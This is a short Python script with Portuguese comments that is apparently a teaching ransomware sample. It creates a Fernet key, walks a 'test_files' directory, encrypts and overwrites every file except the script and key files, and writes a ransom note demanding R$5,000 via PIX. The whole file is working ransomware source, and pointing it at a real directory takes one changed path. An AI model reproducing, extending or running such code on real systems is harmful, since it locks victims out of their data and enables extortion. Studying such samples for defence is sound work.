from cryptography.fernet import Fernet
import os   

# Criando chave
def criando_chave():
    chave = Fernet.generate_key()   # cria uma chave segura
    with open("chave.key", "wb") as chave_file:  # cria arquivo com a chave salva
        chave_file.write(chave)

# Carregando chave
def carregar_chave():
    return open("chave.key", "rb").read()

# Criptografar arquivo
def criptografar_arquivo(arquivo, chave):
    with open(arquivo, "rb") as file:
        dados = file.read() # Lendo arquivo e colocando seus dados em uma variavel
    dados_encriptados = chave.encrypt(dados) # Criptografando arquivo
    with open(arquivo, "wb") as file:
        file.write(dados_encriptados) # Sobrescrevendo arquivo 


# Encontrar arquivos para criptografar
def encontrar_arquivos(diretorio):
    lista_arquivos = []
    for raiz, _, arquivos in os.walk(diretorio): # Andando pelo diretorio
        for nome in arquivos:
            caminho = os.path.join(raiz, nome) # Identificando e atribuindo path para variavel
            if nome != "ransomware.py" and not nome.endswith(".key"):
                lista_arquivos.append(caminho) # Adicionando em uma lista os paths encontrados
    return lista_arquivos


# Mensagem de resquate
def mensagem_resgate():
    with open("LEIA-ME.txt", "w") as resquate:
        resquate.write("Seus arquivos foram criptografados!\n")
        resquate.write("Realize um PIX para chave x no valor de R$5.000,00\n")
        resquate.write("Após transferencia, encaminhar comprovante para e-mail joao@gmail.com\n")
        resquate.write("Depois disso, iremos encaminhar a chave para recuperar seus dados.\n")


# Execucao 

def main():
    if not os.path.exists("chave.key"): # Condicao para nao gerar uma nova chave, caso ela ja tenha sido criada
        criando_chave() 
    chave = carregar_chave()
    cofre = Fernet(chave) # Variavel que sera o cofre para guardar dados
    arquivos = encontrar_arquivos("test_files")
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, cofre)
    mensagem_resgate()


if __name__ == "__main__":
    main()